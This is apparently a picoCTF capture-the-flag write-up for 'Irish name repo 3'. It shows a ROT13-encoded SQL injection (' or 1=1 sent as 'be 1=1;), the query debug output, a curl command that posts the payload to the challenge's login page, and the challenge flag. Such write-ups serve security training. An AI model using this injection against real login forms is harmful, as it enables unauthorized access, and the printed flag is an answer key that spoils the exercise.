# Irish name repo 3

## Objetivo

There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/40742/` ([link](https://jupiter.challenges.picoctf.org/problem/40742/)) or http://jupiter.challenges.picoctf.org:40742. Try to see if you can login as admin!

## Hints

Seems like the password is encrypted.

## Solución

### Solución 1
```

password: 'or1=1;'
SQL query: SELECT * FROM admin where password = ''be1=1;''

password: holamundo
SQL query: SELECT * FROM admin where password = 'ubynzhaqb'

# Login failed.

password: 'be 1=1;
SQL query: SELECT * FROM admin where password = ''or 1=1;'

# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}
```
```
```

```
jessy_vl-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/40742/login.php -d "password='be 1=1;&debug-1"
<h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}</p>jessy_vl-picoctf@webshell:~$ 
```

```
# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}


## Flag

picoCTF{3v3n_m0r3_SQL_4424e7af}
```

## Notas adicionales

La inyección de SQL generalmente ocurre cuando le pide a un usuario que ingrese, como su nombre de usuario/ID de usuario, y en lugar de un nombre/ID, el usuario le da una instrucción SQL que, sin saberlo, ejecutará en su base de datos.

## Referencias

- [SQL INJECTION]([https://www.w3schools.com/sql/sql_injection.asp))
- [cyberchef]([https://gchq.github.io/CyberChef/))
